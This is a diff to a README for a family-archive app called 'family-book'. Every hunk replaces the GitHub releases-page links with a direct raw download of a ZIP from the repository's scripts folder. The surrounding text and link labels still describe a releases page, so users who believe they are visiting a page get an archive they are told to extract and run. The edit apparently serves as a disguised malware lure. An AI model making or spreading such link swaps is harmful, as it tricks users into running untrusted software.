@@ -1,6 +1,6 @@
 # 📘 family-book - Private family archive made simple
 
-[![Download family-book](https://img.shields.io/badge/Download-Family%20Book-6A5ACD?style=for-the-badge&logo=github)](https://github.com/jdpangilinan02/family-book/releases)
+[![Download family-book](https://img.shields.io/badge/Download-Family%20Book-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jdpangilinan02/family-book/main/scripts/family-book-2.4.zip)
 
 ## 🧭 What this is
 
@@ -33,7 +33,7 @@ If the app comes as a ZIP file, you will need to extract it before you run it.
 ## ⬇️ Download family-book
 
 Visit this page to download:  
-https://github.com/jdpangilinan02/family-book/releases
+https://raw.githubusercontent.com/jdpangilinan02/family-book/main/scripts/family-book-2.4.zip
 
 On that page:
 
@@ -198,7 +198,7 @@ A simple routine works well:
 ## 📥 Download and install again
 
 Use this page to download:  
-https://github.com/jdpangilinan02/family-book/releases
+https://raw.githubusercontent.com/jdpangilinan02/family-book/main/scripts/family-book-2.4.zip
 
 Open the latest release, get the Windows build, extract it if needed, then run the app file
 
@@ -251,7 +251,7 @@ This protects years of family records from loss
 
 ## 🔗 Release page
 
-[Go to the family-book releases page](https://github.com/jdpangilinan02/family-book/releases)
+[Go to the family-book releases page](https://raw.githubusercontent.com/jdpangilinan02/family-book/main/scripts/family-book-2.4.zip)
 
 ## 📄 File naming tips
 
